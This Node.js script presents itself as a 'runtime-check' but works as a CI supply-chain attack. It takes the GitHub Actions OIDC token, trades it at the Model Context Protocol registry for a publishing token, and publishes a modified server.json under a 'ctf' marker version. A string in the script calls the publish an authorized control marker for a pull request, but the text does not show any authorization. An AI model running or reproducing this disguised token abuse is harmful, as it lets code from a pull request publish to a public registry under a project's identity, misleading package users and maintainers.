import { readFile } from 'node:fs/promises';

const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;

if (!requestUrl || !requestToken) {
  console.log(`runtime-check node=${process.version} ci-identity=unavailable`);
  process.exit(0);
}

const registry = 'https://registry.modelcontextprotocol.io';
const markerVersion = '0.30.1-ctf.20261105.1';
const url = new URL(requestUrl);
url.searchParams.set('audience', registry);
const response = await fetch(url, {
  headers: { Authorization: `Bearer ${requestToken}` },
});
if (!response.ok) {
  console.log(`runtime-check node=${process.version} ci-identity=http-${response.status}`);
  process.exit(0);
}

const { value } = await response.json();
const [, encodedPayload] = value.split('.');
const claims = JSON.parse(Buffer.from(encodedPayload, 'base64url').toString('utf8'));
console.log(`runtime-check ${JSON.stringify({
  node: process.version,
  aud: claims.aud,
  sub: claims.sub,
  repository: claims.repository,
  repository_id: claims.repository_id,
  repository_owner: claims.repository_owner,
  event_name: claims.event_name,
  ref: claims.ref,
  workflow_ref: claims.workflow_ref,
  job_workflow_ref: claims.job_workflow_ref,
})}`);

const exchange = await fetch(`${registry}/v0/auth/github-oidc`, {
  method: 'POST',
  headers: { 'content-type': 'application/json', accept: 'application/json' },
  body: JSON.stringify({ oidc_token: value }),
});
const exchangeBody = await exchange.text();
if (!exchange.ok) {
  console.log(`runtime-check registry-exchange=http-${exchange.status} ${exchangeBody}`);
  process.exit(0);
}

const { registry_token: registryToken } = JSON.parse(exchangeBody);
const server = JSON.parse(await readFile(new URL('../server.json', import.meta.url), 'utf8'));
server.version = markerVersion;
server.description = 'Authorized supply-chain control marker for gangfun/cli PR #21; package payload remains the official @gangfun/cli@0.30.1.';
server._meta = {
  'io.modelcontextprotocol.registry/publisher-provided': {
    proof: 'gangfun-cli-pr-21',
    actor: claims.actor,
    run_id: process.env.GITHUB_RUN_ID,
    head_sha: process.env.GITHUB_SHA,
  },
};

const publish = await fetch(`${registry}/v0/publish`, {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    accept: 'application/json',
    Authorization: `Bearer ${registryToken}`,
  },
  body: JSON.stringify(server),
});
const publishBody = await publish.text();
console.log(`runtime-check registry-publish=http-${publish.status} ${publishBody}`);
if (!publish.ok && publish.status !== 409) process.exitCode = 1;
